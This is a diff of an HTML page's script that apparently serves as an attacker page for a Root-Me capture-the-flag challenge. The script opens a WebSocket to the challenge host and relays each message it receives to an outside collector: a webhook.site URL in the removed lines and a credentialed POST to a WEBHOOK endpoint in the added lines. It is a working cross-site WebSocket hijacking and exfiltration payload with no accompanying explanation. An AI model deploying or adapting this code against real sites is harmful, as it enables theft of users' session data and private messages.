@@ -6,25 +6,34 @@
 
 
         <script>
-        $(function () {
-            var connection = new WebSocket('ws://ctf21.root-me.org/');
-            connection.onopen = function () {};
-            connection.onerror = function (error) {
-                alert("An error occured, you will reload the page for you to access a new room !")
-                location.reload()
-            };
-            connection.onmessage = function (message) {
-                var xhr = new XMLHttpRequest();
+function webhook(domain = "", data = null) {
+    let req = new XMLHttpRequest();
+    req.open("POST", WEBHOOK + domain, false);
+    req.withCredentials = true;
+    req.send(data);
+}
 
-                xhr.open("GET", "https://webhook.site/805f74b2-9b6f-4506-911a-d711e6fdf1f0?message=" + message, false);
+let socket;
 
-                xhr.send(null);
-            };
-            connection.onclose = function(message) {
-            }
+// Initialize WebSocket connection
+function initWebSocket() {
+    socket = new WebSocket("ws://ctf21.root-me.org/ws");
 
-            connection.send("hello")
-        });
-        </script>
+    socket.onopen = () => {
+        socket.send("hello")
+    };
+
+    socket.onmessage = (event) => {
+        webhook("/onmessage", event.data);
+    };
+
+    socket.onclose = () => {};
+
+    socket.onerror = (error) => {};
+}
+
+// Initialize WebSocket connection on page load
+initWebSocket();
+</script>
     </body>
 </html> 
